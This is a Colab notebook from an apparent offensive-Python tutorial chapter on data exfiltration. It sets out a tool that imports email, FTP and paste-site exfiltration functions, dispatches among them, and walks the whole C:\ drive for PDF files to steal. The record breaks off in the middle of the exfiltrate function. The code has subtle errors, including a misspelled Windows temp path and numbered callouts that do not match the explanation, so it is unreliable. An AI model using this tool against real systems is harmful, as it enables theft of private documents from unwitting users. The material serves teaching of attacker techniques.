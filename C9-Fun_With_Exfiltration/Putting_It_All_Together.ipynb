{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPEVRVWJI4ZzXRPI2KtJPT4",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C9-Fun_With_Exfiltration/Putting_It_All_Together.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Putting It All Together__*\n",
        "\n",
        "Finally, we tie our exfiltration methods together with __exfil.py__, which we can call to exfiltrate files by using any of the methods we've just written:"
      ],
      "metadata": {
        "id": "v95IgUYRzBed"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from cryptor import encrypt, decrypt #[1]\n",
        "from email_exfil import outlook, plain_email\n",
        "from transmit_exfil import plain_ftp, transmit\n",
        "from paste_exfil import ie_paste, plain_paste\n",
        "\n",
        "import os\n",
        "\n",
        "EXFIL = { #[2]\n",
        "    'outlook': outlook,\n",
        "    'plain_email': plain_email,\n",
        "    'plain_ftp': plain_ftp,\n",
        "    'transmit': transmit,\n",
        "    'ie_paste': ie_paste,\n",
        "    'plain_paste': plain_paste\n",
        "}"
      ],
      "metadata": {
        "id": "n9E1m9X1zVy_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "First, import the modules and functions you just wrote __[1]__. Then, create a dictionary called __EXFIL__ whose values correspond to the imported functions __[2]__. This will make calling the different exfiltration functions very easy. The values are the names of the functions, because, in Python, functions are first-class citizens and can be used as parameters. This technique is sometimes called __dictionary_dispatch__. It works much like a case statement in other languages.\n",
        "\n",
        "Now we need to create a function that will find the documents we want to exfiltrate:"
      ],
      "metadata": {
        "id": "yaeb-Xyqz4fw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def find_docs(doc_type='.pdf'):\n",
        "    for parent, _, filenames in os.walk('c:\\\\'): #[2]\n",
        "        for filename in filenames:\n",
        "            if filename.endswith(doc_type):\n",
        "                document_path = os.path.join(parent, filename)\n",
        "                yield document_path #[2]"
      ],
      "metadata": {
        "id": "47YKN9V50z_e"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __find_docs__ generator walks the entire filesystem checking for PDF documents __[1]__. When it finds one, it returns the full path and yields back execution to the caller __[2]__.\n",
        "\n",
        "Next, we create the main function to orchestrate the exfiltration:"
      ],
      "metadata": {
        "id": "GYoxEUjx1Plo"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def exfiltrate(document_path, method): #[1]\n",
        "    if method in ['transmit', 'plain_ftp']: #[2]\n",
        "        filename = f'c:\\\\windws\\\\temp\\\\{os.path.basename(document_path)}'"
      ],
      "metadata": {
        "id": "oHsZZ-fs1xx3"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}